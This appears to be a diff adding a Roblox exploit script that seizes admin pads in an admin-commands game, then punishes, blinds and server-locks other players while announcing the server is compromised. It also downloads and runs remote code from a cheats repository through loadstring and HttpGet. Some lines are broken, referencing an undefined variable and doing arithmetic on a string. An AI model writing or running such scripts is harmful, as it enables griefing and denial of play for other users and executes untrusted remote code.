@@ -1,0 +1,50 @@
+local plrs = game:GetService'Players'
+local lp = game.Players.LocalPlayer
+local Admin = game:GetService("Workspace").Terrain["_Game"].Admin
+local Pads = Admin.Pads
+local regen = Admin:FindFirstChild("Regen")
+
+
+fireclickdetector(regen.ClickDetector, 0)
+wait(.12)
+for i, v in pairs(Pads:GetChildren()) do
+    spawn(
+    function()
+        firetouchinterest(lp.Character:WaitForChild("Head"), v.Head, 0)
+        firetouchinterest(lp.Character:WaitForChild("Head"), v.Head, 1)
+    end
+    )
+    wait(.00000001)
+end
+
+wait(.1)
+plrs:Chat("setgrav random -9e9")
+wait(.9)
+plrs:Chat("punish others")
+plrs:Chat("blind others")
+plrs:Chat("h Slock Enabled")
+plrs:Chat("m The Server has been compromised by Me!!! You'll be unable to play in this server unless I un s lock you.")
+plrs.PlayerAdded:Connect(function(plyr)
+    repeat wait()
+        until plyr.Character
+    plrs:chat("punish "..plyr.Name)
+    plyr.CharacterAdded:Connect(function()
+        if plyr.Name ~= lp.Name then
+       game.Players:Chat("punish "..v.Name)
+       game.Players:Chat("blind "..v.Name)
+        plrs:chat("punish "..plyr.Name)
+        plrs:chat("blind "..plyr.Name)
+        plrs:chat("pm "..plyr.Name.." You can't un s lock yourseIf when you don't have the permission")
+    end
+    end)
+end)
+
+for _, v in pairs(plrs:GetChildren()) do
+    v.CharacterAdded:Connect(function()
+        if v.Name ~= lp.Name then
+       game.Players:Chat("setgrav "..v.Name -9e9)
+       game.Players:Chat("punish "..v.Name)
+       loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/slock%20component'),true))()
+    end
+    end)
+end
